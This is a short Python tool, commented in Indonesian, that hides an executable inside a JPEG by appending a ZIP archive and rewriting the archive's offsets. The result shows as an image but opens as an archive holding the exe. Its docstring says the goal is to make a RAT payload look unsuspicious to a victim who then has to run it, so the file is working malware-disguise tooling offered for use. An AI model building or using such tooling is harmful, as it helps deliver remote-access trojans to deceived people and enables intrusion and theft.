"""tools/polyglot.py — JPEG|ZIP polyglot.

File hasil: Explorer buka sebagai gambar, 7-Zip/WinRAR/Explorer buka sebagai
arsip berisi exe. Trik-nya ZIP central directory nyimpen offset absolut, jadi
tiap offset harus digeser sebesar panjang gambar.

Yang TIDAK bisa: double-click gambar terus RAT jalan. Eksekusi tetap butuh
langkah kedua dari korban. File ini cuma bikin bentuknya nggak mencurigakan.
"""

import os
import struct
import zipfile

EOCD = b"PK\x05\x06"
CDIR = b"PK\x01\x02"


def _zip_single(payload, dest):
    with zipfile.ZipFile(dest, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(payload, os.path.basename(payload))
    return dest


def _shift(data, prefix_len):
    eocd = data.rfind(EOCD)
    if eocd < 0:
        raise ValueError("EOCD tidak ketemu, file bukan zip valid")
    cd_off = struct.unpack_from("<I", data, eocd + 16)[0]
    cd_size = struct.unpack_from("<I", data, eocd + 12)[0]
    struct.pack_into("<I", data, eocd + 16, cd_off + prefix_len)

    p = cd_off + prefix_len
    end = p + cd_size
    while p < end:
        if data[p:p + 4] != CDIR:
            raise ValueError("central directory rusak di offset %d" % p)
        loc = struct.unpack_from("<I", data, p + 42)[0]
        struct.pack_into("<I", data, p + 42, loc + prefix_len)
        nlen, elen, clen = struct.unpack_from("<HHH", data, p + 28)
        p += 46 + nlen + elen + clen
    return data


def wrap(image_path, artifact, out_path):
    """Tempel ZIP (berisi artifact) di belakang gambar."""
    tmp_zip = out_path + ".zip"
    _zip_single(artifact, tmp_zip)
    img = open(image_path, "rb").read()
    blob = open(tmp_zip, "rb").read()
    data = bytearray(img + blob)
    data = _shift(data, len(img))
    with open(out_path, "wb") as fh:
        fh.write(data)
    os.remove(tmp_zip)
    return out_path


if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("pakai: python polyglot.py <gambar.jpg> <payload.exe> <hasil.jpg>")
        sys.exit(1)
    print(wrap(sys.argv[1], sys.argv[2], sys.argv[3]))
